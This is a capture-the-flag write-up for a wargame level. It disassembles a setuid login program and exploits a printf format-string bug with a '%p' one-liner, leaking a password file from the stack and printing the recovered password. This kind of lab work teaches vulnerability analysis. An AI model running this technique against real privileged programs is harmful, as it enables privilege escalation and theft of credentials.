```shell
$> ls -la
[...]
-rwsr-s---+ 1 level03 users   9452 Sep 10  2016 level02
[...]

$> ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: admin
--[ Password: password
*****************************************
admin does not have access!
```

Analyze with ghidra and disassembler the code in GDB

```c
// check source.c file
```

```shell
$> gdb -q level02
(gdb) set disassembly-flavor intel
(gdb) disas main
    [...]
    0x0000000000400898 <+132>:   mov    edx,0x400bb0
    0x000000000040089d <+137>:   mov    eax,0x400bb2
    0x00000000004008a2 <+142>:   mov    rsi,rdx
    0x00000000004008a5 <+145>:   mov    rdi,rax
    0x00000000004008a8 <+148>:   call   0x400700 <fopen@plt>
    [...]
    0x00000000004008e6 <+210>:   lea    rax,[rbp-0xa0]
    0x00000000004008ed <+217>:   mov    rdx,QWORD PTR [rbp-0x8]
    0x00000000004008f1 <+221>:   mov    rcx,rdx
    0x00000000004008f4 <+224>:   mov    edx,0x29
    0x00000000004008f9 <+229>:   mov    esi,0x1
    0x00000000004008fe <+234>:   mov    rdi,rax
    0x0000000000400901 <+237>:   call   0x400690 <fread@plt>
    [...]
    0x0000000000400a96 <+642>:   lea    rax,[rbp-0x70]
    0x0000000000400a9a <+646>:   mov    rdi,rax
    0x0000000000400a9d <+649>:   mov    eax,0x0
    0x0000000000400aa2 <+654>:   call   0x4006c0 <printf@plt>
    [...]

# 1st part: fopen calls to open the .pass file
# 2nd part: fread calls to read the .pass file and store it in the buffer ([rbp-0xa0])
# 3rd part: printf calls to print the buffer ([rbp-0x70]), here makes the vulnerability case
```

We know .pass content stock in stack, and with printf format vulnerability, we can print the content of the stack.

```shell
$> python -c "print '%p ' * 100" | ./level02
[...]
0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d
[...]

$> python3 pass.py
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```